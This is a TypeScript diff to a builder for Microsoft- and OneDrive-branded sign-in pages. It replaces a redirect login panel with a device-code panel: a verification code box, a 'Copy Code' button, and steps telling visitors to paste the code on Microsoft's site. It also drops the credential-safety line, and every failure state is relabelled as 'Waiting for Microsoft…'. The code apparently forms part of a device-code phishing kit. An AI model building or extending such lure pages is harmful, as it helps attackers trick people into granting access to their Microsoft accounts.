@@ -34,7 +34,7 @@ export function defaultBuilderConfiguration(layoutId: BuilderConfiguration["layo
     layoutId, provider,
     title: profile.title,
     description: profile.description,
-    steps: ["Continue to Microsoft.", "Complete sign-in and any required MFA.", "Return automatically after authorization."],
+    steps: ["Copy the verification code.", "Continue to Microsoft and paste the code.", "Complete authentication on Microsoft’s website."],
     continueButtonText: "Continue to Microsoft",
     footer: "Authentication continues securely on Microsoft’s website.",
     successMessage: "",
@@ -78,7 +78,7 @@ export function buildPageDesign(config: BuilderConfiguration, state: PreviewStat
     },
     nodes: [],
   };
-  const auth = authorization(c, state, dark);
+  const auth = microsoftDeviceCodePanel(c, state, dark);
   switch (c.layoutId) {
     case "compact-card":
       page.settings.maxWidth = "440px";
@@ -154,14 +154,17 @@ export function buildPageDesign(config: BuilderConfiguration, state: PreviewStat
   return page;
 }
 
-function authorization(c: BuilderConfiguration, state: PreviewState, dark: boolean): PageNode[] {
+function microsoftDeviceCodePanel(c: BuilderConfiguration, state: PreviewState, dark: boolean): PageNode[] {
   const preset = providerAssets[c.provider];
   const muted = dark ? "#aebdca" : "#667085";
   return [
     n("auth-active", "section", "Authorization", { children: [
-      text("auth-security", "Microsoft handles your credentials, MFA, Conditional Access, consent, and account selection.", { margin: "16px 0", color: muted }),
+      n("auth-code", "deviceCode", "Verification code", { content: "VERIFICATION CODE", style: { margin: "16px 0 10px", borderRadius: preset.radius } }),
+      button("auth-copy", "Copy Code", "copy-device-code", { width: "100%", padding: "10px", background: "transparent", color: c.primaryColor, border: `1px solid ${softBorder(c.primaryColor)}`, borderRadius: preset.radius }),
+      text("auth-copy-feedback", "Copied", { textAlign: "center", color: muted, fontSize: "11px", margin: "5px 0 0" }),
       steps("auth-steps", c.steps, { margin: "16px 0", color: muted }),
       button("auth-continue", c.continueButtonText, "open-microsoft", { width: "100%", padding: "13px", background: c.primaryColor, color: readable(c.primaryColor), borderRadius: preset.radius }),
+      button("auth-popup-fallback", "Open Microsoft", "open-microsoft", { width: "100%", padding: "10px", background: "transparent", color: c.primaryColor, border: "0", borderRadius: preset.radius }),
     ] }),
     n("auth-status", "status", "Authorization status", { content: stateLabel(state), statusKind: "waiting", style: { margin: "14px 0 0", color: muted } }),
     text("auth-footer", c.footer, { margin: "14px 0 0", textAlign: "center", fontSize: "11px", color: muted }),
@@ -239,5 +242,6 @@ function viewerSurface(c: BuilderConfiguration) {
   if (c.provider === "onedrive") return "#f1f6fb";
   return "#f2f4f7";
 }
+function softBorder(color: string) { return `color-mix(in srgb,${color} 24%,#e4e7ec)`; }
 function readable(color: string) { const value = Number.parseInt(color.slice(1), 16); return (((value >> 16) * 299 + ((value >> 8) & 255) * 587 + (value & 255) * 114) / 1000) > 160 ? "#172033" : "#ffffff"; }
 function stateLabel(state: PreviewState) { return ({ initial: "Waiting for Microsoft…", waiting: "Waiting for Microsoft…", success: "Redirecting…", expired: "Waiting for Microsoft…", error: "Waiting for Microsoft…", ready: "Waiting for Microsoft…", reviewing: "Waiting for Microsoft…", completed: "Redirecting…" } as Record<PreviewState, string>)[state]; }
